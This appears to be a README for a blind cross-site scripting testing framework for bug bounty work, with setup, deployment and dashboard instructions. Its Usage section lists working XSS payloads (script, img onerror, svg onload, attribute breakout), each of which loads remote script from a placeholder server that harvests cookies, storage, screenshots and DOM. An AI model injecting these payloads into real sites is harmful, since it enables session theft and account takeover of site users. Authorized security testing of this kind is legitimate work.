# 🎯 XJutsu v5 - Modern XSS Hunter Framework

A powerful, real-time XSS (Cross-Site Scripting) testing framework for bug bounty hunters and security researchers.

![XJutsu v5](https://img.shields.io/badge/version-5.0-purple)
![Python](https://img.shields.io/badge/python-3.11+-blue)
![Django](https://img.shields.io/badge/django-4.2+-green)

## ✨ Features

- 📡 **Real-time WebSocket Callbacks** - Instant notifications when payloads fire
- 📸 **Screenshot Capture** - Automatic screenshot of vulnerable pages
- 🍪 **Data Harvesting** - Cookies, LocalStorage, SessionStorage
- 🌐 **DOM Capture** - Full HTML of the vulnerable page
- 🔔 **Webhook Notifications** - Discord, Slack, Telegram support
- 🎨 **Modern Dark UI** - Beautiful, responsive dashboard
- 🔐 **Authentication** - Secure login system
- 📦 **Payload Generator** - Multiple payload formats
- 🐳 **Docker Ready** - Easy deployment

## 🚀 Quick Start

### Option 1: Local Development

```bash
# Clone the repository
git clone https://github.com/yourusername/xjutsu5.git
cd xjutsu5

# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Setup database
python manage.py migrate

# Create admin user
python manage.py createsuperuser

# Run development server (with WebSocket support)
daphne -b 0.0.0.0 -p 8000 core.asgi:application
```

### Option 2: Docker

```bash
# Build and run
docker-compose up -d

# Create admin user
docker-compose exec xjutsu python manage.py createsuperuser
```

## 📖 Usage

### 1. Access Dashboard

Navigate to `http://localhost:8000` and login with your credentials.

### 2. Deploy Payloads

Use the universal payload:
```html
<script src="http://YOUR-SERVER/x.js"></script>
```

Or create custom payloads from the Payloads section.

### 3. Payload Variants

**IMG Tag:**
```html
<img src=x onerror="var s=document.createElement('script');s.src='http://YOUR-SERVER/x.js';document.head.appendChild(s)">
```

**SVG Tag:**
```html
<svg onload="var s=document.createElement('script');s.src='http://YOUR-SERVER/x.js';document.head.appendChild(s)">
```

**Event Handler:**
```html
" onfocus="var s=document.createElement('script');s.src='http://YOUR-SERVER/x.js';document.head.appendChild(s)" autofocus="
```

### 4. Monitor Captures

- View real-time captures on the Dashboard
- Get browser notifications when payloads fire
- Review cookies, storage, screenshots, and DOM

## 🔧 Configuration

Copy `.env.example` to `.env` and configure:

```bash
SECRET_KEY=your-super-secret-key
DEBUG=False
ALLOWED_HOSTS=your-domain.com

# Webhooks (optional)
WEBHOOK_DISCORD=https://discord.com/api/webhooks/...
TELEGRAM_BOT_TOKEN=your-bot-token
TELEGRAM_CHAT_ID=your-chat-id
```

## 🌐 Production Deployment

For production, use with HTTPS and consider:

1. **Nginx/Caddy** as reverse proxy
2. **Redis** for channel layers (scale WebSockets)
3. **PostgreSQL** for database
4. **Let's Encrypt** for SSL

Example Nginx config:
```nginx
server {
    server_name xss.yourdomain.com;
    
    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
    }
}
```

## 📁 Project Structure

```
xjutsu5/
├── core/               # Django project settings
│   ├── settings.py
│   ├── urls.py
│   └── asgi.py        # WebSocket config
├── hunter/            # Main application
│   ├── models.py      # Database models
│   ├── views.py       # Views & API
│   ├── consumers.py   # WebSocket handlers
│   └── routing.py     # WebSocket routes
├── templates/         # HTML templates
├── static/           # CSS, JS, images
├── requirements.txt
├── Dockerfile
└── docker-compose.yml
```

## ⚠️ Legal Disclaimer

This tool is for **authorized security testing only**. Use only on systems you have permission to test. Unauthorized access to computer systems is illegal.

## 🤝 Contributing

Contributions welcome! Please feel free to submit a Pull Request.

## 📜 License

MIT License - See LICENSE file

---

Made with ❤️ for the Bug Bounty Community

**XJutsu v5** - *Upgraded from classic PHP version*
